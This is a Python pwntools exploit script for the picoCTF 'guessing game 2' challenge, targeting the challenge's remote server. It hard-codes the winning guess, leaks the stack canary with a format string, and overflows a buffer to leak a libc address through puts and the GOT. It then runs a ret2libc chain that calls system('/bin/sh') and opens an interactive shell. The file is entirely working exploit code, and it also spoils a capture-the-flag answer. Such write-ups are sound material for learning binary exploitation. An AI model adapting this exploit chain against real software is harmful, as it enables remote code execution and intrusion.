from pwn import *
context.log_level = 'debug'
# winning number is -3727 for remote 
answer = b'-3727'
e = ELF('./guessinggame2')
libc = ELF('./libc-gg2.so')
r = remote('jupiter.challenges.picoctf.org', 18263)
#r = gdb.debug('./guessinggame2', 'b win\nc')
#r = process('./guessinggame2')
# canary is at %135$p 
r.sendline(answer)
r.sendline(b'%135$p')
r.recvuntil(b'Congrats: ')
canary = p32(int(r.recvline(), 16))
print(f'canary = {canary.hex()}')
r.sendline(answer)
def makep(c):
    p = b'a'*0x200+canary+b'a'*(0x210-0x200-4)
    p += c 
    return p 
def leak(f):
    payload = makep(p32(e.sym['puts']) + p32(e.sym['win']) + p32(e.got[f]))
    r.sendline(payload)
    r.recvuntil(b'a\x0a\x0a')
    return u32(r.recv(4))
puts_addr = leak('puts')
print(f'puts_addr = {hex(puts_addr)}')
libc.address = puts_addr - libc.sym['puts']
print(f'libc.address = {hex(libc.address)}')

# leak more as needed
#gets_addr = leak('gets')
#print(f'gets_addr = {hex(gets_addr)}')
#printf_addr = leak('printf')
#print(f'printf_addr = {hex(printf_addr)}')

r.sendline(makep(p32(libc.sym['system']) + b'a'*4 + p32(next(libc.search(b'/bin/sh\x00')))))

r.interactive()
